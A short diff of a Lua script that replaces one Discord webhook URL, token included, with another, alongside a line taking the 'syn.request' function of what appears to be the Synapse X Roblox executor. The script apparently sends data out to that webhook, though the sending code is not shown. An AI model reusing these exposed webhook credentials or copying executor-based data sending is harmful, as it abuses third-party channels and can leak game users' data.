@@ -1,4 +1,4 @@
-local url = 'https://discord.com/api/webhooks/853518088526626866/PTXcUPM46EAzngycOd2CS4arczSvKGpQTAZIpO0UgAMZh3sdUNoRm8iPs_vwdabc7jY4'
+local url = 'https://discord.com/api/webhooks/865078271120900096/NN7q9sJM6jJFALJH8Vp7hIqZvFgO27dbANetptI3eo-IKLVqfeWxFsCG21zOkvhWP8cR'
 local req = syn.request
 
 
